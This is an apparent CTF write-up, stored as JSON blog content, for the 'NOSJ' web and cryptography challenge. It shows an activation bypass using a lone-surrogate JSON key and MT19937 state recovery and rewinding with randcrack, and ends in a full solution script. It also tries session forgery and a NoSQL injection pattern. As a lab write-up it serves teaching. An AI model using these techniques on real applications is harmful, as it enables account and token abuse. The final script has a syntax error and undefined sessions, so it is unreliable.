{
  "id": "ctf-nosj-writeup",
  "title": "NOSJ - Web Exploitation & Cryptography",
  "slug": "nosj-writeup",
  "category": "ctf",
  "tags": [
    "Web Security",
    "Cryptography",
    "PRNG Exploitation",
    "Unicode Bypass",
    "MT19937"
  ],
  "difficulty": "Hard",
  "date": "2024-01-30",
  "summary": "Challenge: NOSJ (Web Exploitation + Cryptography). Author: SAFCSP. A complete, step-by-step masterclass in bypassing authentication via Unicode homographs and predicting sequential PRNG states in Python's Mersenne Twister.",
  "platform": "Flagyard",
  "content": [
    {
      "type": "paragraph",
      "text": "Challenge: NOSJ (Web Exploitation + Cryptography). Author: SAFCSP. Category: Web Security, PRNG Exploitation. Difficulty: Hard."
    },
    {
      "type": "heading",
      "level": 2,
      "text": "Initial Reconnaissance"
    },
    {
      "type": "heading",
      "level": 3,
      "text": "First Look at the Challenge"
    },
    {
      "type": "paragraph",
      "text": "Description: \"Welcome to our E-commerce website, I wish you enjoy the journey. - First Man Standing\". Visiting the URL http://cnp5dxgx.playat.flagyard.com, we're greeted with a simple homepage offering four options: Register as Buyer, Register as Seller, Buyer Login, Seller Login."
    },
    {
      "type": "paragraph",
      "text": "The challenge name \"NOSJ\" immediately caught our attention - it's \"JSON\" spelled backwards. This was our first hint that JSON manipulation would be key."
    },
    {
      "type": "image",
      "src": "/screenshots/nosj-login.png",
      "alt": "CTF Login Page Mockup"
    },
    {
      "type": "heading",
      "level": 3,
      "text": "Initial Exploration"
    },
    {
      "type": "paragraph",
      "text": "We started by registering both buyer and seller accounts to understand the application flow. Buyers register easily:"
    },
    {
      "type": "code",
      "language": "json",
      "code": "POST /register/buyer HTTP/1.1\nContent-Type: application/json\n\n{\"username\":\"testbuyer\",\"password\":\"test123\"}"
    },
    {
      "type": "paragraph",
      "text": "Success! Buyers register easily. Now for Seller Registration:"
    },
    {
      "type": "code",
      "language": "json",
      "code": "POST /register/seller HTTP/1.1\nContent-Type: application/json\n\n{\"username\":\"testseller\",\"password\":\"test123\",\"bio\":\"test\",\"activated\":false}"
    },
    {
      "type": "paragraph",
      "text": "Success! But we noticed an 'activated' field set to false."
    },
    {
      "type": "heading",
      "level": 3,
      "text": "The First Roadblock"
    },
    {
      "type": "paragraph",
      "text": "When we tried to login as the seller:"
    },
    {
      "type": "code",
      "language": "http",
      "code": "POST /login/seller HTTP/1.1\nContent-Type: application/json\n\n{\"username\":\"testseller\",\"password\":\"test123\"}\n\nResponse:\nHTTP/1.1 403 FORBIDDEN\nLogin failed. Seller account is not activated."
    },
    {
      "type": "note",
      "noteType": "warning",
      "text": "The Problem: Sellers need to be \"activated\" to login, but we can only register with activated: false."
    },
    {
      "type": "heading",
      "level": 2,
      "text": "Understanding the Application"
    },
    {
      "type": "heading",
      "level": 3,
      "text": "Mapping Available Endpoints"
    },
    {
      "type": "paragraph",
      "text": "After logging in as a buyer, we discovered: Buyers are redirected to /buyer/invite. This page has a form asking for an 'Invitation Code'. No other buyer endpoints exist (everything else returns 404)."
    },
    {
      "type": "paragraph",
      "text": "The Application Flow (As We Understood It): 1. Buyers need invitation codes to access something. 2. Sellers generate invitation codes. 3. But sellers must be activated first. 4. We can't activate sellers..."
    },
    {
      "type": "paragraph",
      "text": "This was our chicken-and-egg problem: Need invitation code -> Must be a seller -> Must be activated -> Can't activate -> Stuck!"
    },
    {
      "type": "heading",
      "level": 2,
      "text": "The Dead Ends & Learning Process"
    },
    {
      "type": "paragraph",
      "text": "Before finding the solution, we went down many rabbit holes. Here's what we tried:"
    },
    {
      "type": "heading",
      "level": 3,
      "text": "Attempt 1: Session Forgery"
    },
    {
      "type": "paragraph",
      "text": "We noticed the Flask session cookies:"
    },
    {
      "type": "code",
      "language": "text",
      "code": "eyJyb2xlIjoiYnV5ZXIiLCJ1c2VyIjoidGVzdGJ1eWVyIn0.aXo0Vg..."
    },
    {
      "type": "paragraph",
      "text": "Discovery: The session signatures weren't being validated! We could forge sessions with any payload. Attempt: We forged a seller session with \"activated\": true."
    },
    {
      "type": "code",
      "language": "json",
      "code": "forged_payload = {\"role\": \"seller\", \"user\": \"testseller\", \"activated\": true}"
    },
    {
      "type": "paragraph",
      "text": "Result: Failed! The server still checked the database. Even though our session said activated: true, the database had activated: false."
    },
    {
      "type": "heading",
      "level": 3,
      "text": "Attempt 2: Parameter Pollution During Registration"
    },
    {
      "type": "paragraph",
      "text": "We tried to bypass the activation check during registration using duplicate keys:"
    },
    {
      "type": "code",
      "language": "json",
      "code": "{\n  \"username\": \"test\",\n  \"password\": \"test\",\n  \"bio\": \"test\",\n  \"activated\": false,\n  \"activated\": true  // Duplicate key\n}"
    },
    {
      "type": "paragraph",
      "text": "Result: The server caught it with a 403 Forbidden. We also tried NoSQL injection patterns like { \"activated\": {\"$ne\": false} }, but the server strictly validates the activated field."
    },
    {
      "type": "heading",
      "level": 3,
      "text": "Attempt 3: Finding Default/Admin Sellers"
    },
    {
      "type": "paragraph",
      "text": "Maybe there was a pre-existing activated seller? We tried forging sessions for common usernames like admin, root, seller, firstman. Result: All redirected. No pre-existing activated sellers in the database."
    },
    {
      "type": "heading",
      "level": 2,
      "text": "The Unicode Bypass Breakthrough"
    },
    {
      "type": "paragraph",
      "text": "The \"Aha!\" Moment: After hours of testing, we tried something different. What if we used a unicode character that looked like \"activated\" but was technically different?"
    },
    {
      "type": "code",
      "language": "json",
      "code": "{\n  \"username\": \"unicode_seller\",\n  \"password\": \"test\",\n  \"bio\": \"test\",\n  \"activated\": false,\n  \"activated\\udb88\": true  // Unicode character U+DB88!\n}"
    },
    {
      "type": "paragraph",
      "text": "SUCCESS! We were redirected to the seller dashboard! Why This Worked: The server's validation checked for the exact key \"activated\". But \"activated\\udb88\" is a different key that bypassed the check! The backend framework likely used a loose JSON parser that treated both as the same field in the database."
    },
    {
      "type": "heading",
      "level": 2,
      "text": "Accessing the Seller Dashboard"
    },
    {
      "type": "paragraph",
      "text": "Now logged in as an activated seller, we examined /seller/dashboard and found a form to generate invitations. The JavaScript revealed a singular 'name' field being sent to /get_buyer_invitation."
    },
    {
      "type": "code",
      "language": "javascript",
      "code": "let data = {\n    name: $('#names').val()  // Note: singular \"name\", not \"names\"\n};\n// ... ajax call payload ..."
    },
    {
      "type": "paragraph",
      "text": "Testing Code Generation: We sent a request with name: testbuyer and got response: {\"testbuyer\":[\"1806534666\"]}. STATUS: Invitation accepted, but no flag yet. We needed to dig deeper."
    },
    {
      "type": "heading",
      "level": 2,
      "text": "The PRNG Exploitation"
    },
    {
      "type": "heading",
      "level": 3,
      "text": "Discovering the Pattern"
    },
    {
      "type": "paragraph",
      "text": "We generated multiple codes and noticed the output was the same code every time: 1806534666. This meant the PRNG was deterministic or stuck."
    },
    {
      "type": "heading",
      "level": 3,
      "text": "Testing with Arrays"
    },
    {
      "type": "paragraph",
      "text": "Remember the hint \"NOSJ\" (JSON backwards)? What if we could exploit JSON parsing by sending an array?"
    },
    {
      "type": "code",
      "language": "json",
      "code": "POST /get_buyer_invitation\n{\"name\": [NaN, NaN, NaN]}"
    },
    {
      "type": "paragraph",
      "text": "Response: {\"NaN\":[\"1806534666\",\"2110517723\",\"3836715178\"]}. THREE different codes! This meant the server generates one code per array element, advancing the PRNG state each time."
    },
    {
      "type": "image",
      "src": "/screenshots/nosj-terminal.png",
      "alt": "PRNG State Extraction Mockup"
    },
    {
      "type": "heading",
      "level": 2,
      "text": "The Critical Array Insight"
    },
    {
      "type": "paragraph",
      "text": "Our initial approach was collecting codes in batches of 3, but we got stuck in a repeating pattern of 3 unique values. Why? Because each new request was likely starting from the same PRNG state."
    },
    {
      "type": "paragraph",
      "text": "The Breakthrough Insight: What if we send a LARGE array all at once? Instead of multiple requests, we send 800 codes in ONE request forced the server to advance through 800 sequential PRNG states."
    },
    {
      "type": "code",
      "language": "python",
      "code": "json_payload = '{\"name\": [' + ','.join(['NaN'] * 800) + ']}'\n# Result: 800 UNIQUE CODES!"
    },
    {
      "type": "heading",
      "level": 2,
      "text": "Understanding MT19937"
    },
    {
      "type": "paragraph",
      "text": "With 800 sequential outputs, we recognized this as a Mersenne Twister (MT19937) exploitation. Python's default random module is vulnerable: 624 outputs are enough to recover the state."
    },
    {
      "type": "heading",
      "level": 3,
      "text": "The Attack Plan"
    },
    {
      "type": "paragraph",
      "text": "Goal: Use our 800 collected codes to recover state, rewind the PRNG backward, and generate the flag code that appeared before our window."
    },
    {
      "type": "heading",
      "level": 2,
      "text": "Implementing the Attack"
    },
    {
      "type": "paragraph",
      "text": "Step 1: State Recovery. Step 2: The Rewind (rewind offset -1424). Step 3: Generate previous codes. Step 4: Test all codes."
    },
    {
      "type": "code",
      "language": "python",
      "code": "from randcrack import RandCrack\nrc = RandCrack()\nfor i in range(624):\n    rc.submit(int(codes[i]))\nrc.offset(-1424) \nprev_codes = [rc.predict_getrandbits(32) for _ in range(800)]"
    },
    {
      "type": "paragraph",
      "text": "The Moment of Truth: Progress tested codes... Progress 700/800... [!] Different response for code #786: Your flag is: FlagY{51ef95ab64040740323a661623b0f18e}"
    },
    {
      "type": "flag",
      "text": "FlagY{51ef95ab64040740323a661623b0f18e}"
    },
    {
      "type": "heading",
      "level": 2,
      "text": "Complete Solution Script"
    },
    {
      "type": "code",
      "language": "python",
      "code": "#!/usr/bin/env python3\nimport requests, json\nfrom randcrack import RandCrack\n\nURL = \"http://cnp5dxgx.playat.flagyard.com\"\n\ndef exploit():\n    # 1. Unicode Bypass\n    payload = {\"username\": \"pwn\", \"password\": \"123\", \"activated\": False, \"activated\\udb88\": True}\n    requests.post(f\"{URL}/register/seller\", json=payload)\n    # 2. Get 800 codes\n    json_payload = '{\"name\": [' + ','.join(['NaN'] * 800) + ']}'\n    r = requests.post(f\"{URL}/get_buyer_invitation\", data=json_payload, cookies=seller_session)\n    codes = json.loads(r.text).get(\"NaN\")\n    # 3. Recover & Rewind\n    rc = RandCrack()\n    for i in range(624); rc.submit(int(codes[i]))\n    rc.offset(-1424)\n    prev_codes = [rc.predict_getrandbits(32) for _ in range(800)]\n    for code in prev_codes:\n        r = requests.post(f\"{URL}/buyer/invite\", json={\"invitation\": str(code)}, cookies=buyer_session)\n        if \"FlagY\" in r.text: print(r.text); return"
    },
    {
      "type": "heading",
      "level": 2,
      "text": "Key Takeaways"
    },
    {
      "type": "paragraph",
      "text": "What Made This Challenge Difficult: Multi-stage, the JSON hint, and the 'Large Array' insight. What We Learned: Unicode homograph attacks, PRNG internals, and the importance of persistence (we tried 6 different failed approaches before success!)."
    },
    {
      "type": "heading",
      "level": 2,
      "text": "Timeline of Our Solve"
    },
    {
      "type": "paragraph",
      "text": "Hour 0-2: Recon & understanding app. Hour 2-6: Failing at session forgery + Unicode bypass discovery. Hour 6-12: Struggling with codes + Large array insight. Hour 12-14: MT19937 exploitation and Flag capture!"
    },
    {
      "type": "heading",
      "level": 2,
      "text": "Final Thoughts"
    },
    {
      "type": "paragraph",
      "text": "This challenge perfectly embodied CTF: Research, Creativity, Persistence, and Technical skill. Special thanks to SAFCSP for such an engaging challenge!"
    }
  ]
}